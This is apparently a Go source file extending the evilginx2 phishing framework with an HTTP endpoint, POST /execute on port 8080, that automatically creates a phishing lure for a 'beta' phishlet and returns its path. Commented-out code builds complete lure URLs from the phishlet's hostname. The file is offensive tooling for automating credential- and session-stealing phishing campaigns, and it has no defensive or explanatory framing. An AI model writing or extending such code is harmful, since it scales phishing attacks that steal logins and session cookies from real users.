package core

import (
	//"fmt"
	//"strconv"
	//"strings"
	"net/http"
        "github.com/kgretzky/evilginx2/database"
        "github.com/kgretzky/evilginx2/log"

)

func executeFunc(cfg *Config, crt_db *CertDb, db *database.Database) http.HandlerFunc {
  return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
	  lg, err := NewLinkGrabber(cfg, crt_db, db)
	  if err != nil {
		  log.Info("err", err)
		  return
	  }

	  // CREATE LURE
	  //lg.GrabLures([]string{"lures", "beta", "beta"})
	  lg.GrabLures([]string{"lures", "beta", "beta"})

	  // GET LURE VIA ID
	  //l_id, err := strconv.Atoi(strings.TrimSpace([]string{"4"})
	  //if err != nil {
	  //        return fmt.Errorf("get-url: %v", err)
	  //}
	  //l, err := t.cfg.GetLure(l_id)
	  l, err := cfg.GetLure(lg.lastLureID)
	  if err != nil {
		  log.Info("get-url: %v", err)
		  return
	  }

	  lure := l.Path
	  log.Info("lure successfully grabbed...")
	  responseLure := lure
	  w.Header().Set("Content-Type", "text/plain")
	  w.Write([]byte(responseLure))
  })
}

//l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
//if err != nil {
//	return fmt.Errorf("get-url: %v", err)
//}
//l, err := t.cfg.GetLure(l_id)
//if err != nil {
//	return fmt.Errorf("get-url: %v", err)
//}
//pl, err := t.cfg.GetPhishlet(l.Phishlet)
//if err != nil {
//	return fmt.Errorf("get-url: %v", err)
//}
//bhost, ok := t.cfg.GetSiteDomain(pl.Name)
//if !ok || len(bhost) == 0 {
//	return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
//}
//
//var base_url string
//if l.Hostname != "" {
//	base_url = "https://" + l.Hostname + l.Path
//} else {
//	purl, err := pl.GetLureUrl(l.Path)
//	if err != nil {
//		return err
//	}
//	base_url = purl
//}

func StartServer(cfg *Config, crt_db *CertDb, db *database.Database) {
	http.HandleFunc("POST /execute", executeFunc(cfg, crt_db, db)) // root path
	log.Info("server started:8080...")
	if err := http.ListenAndServe("0.0.0.0:8080", nil); err != nil {
		log.Info("error:", err)
	} else {
		log.Info("done")
	}
}
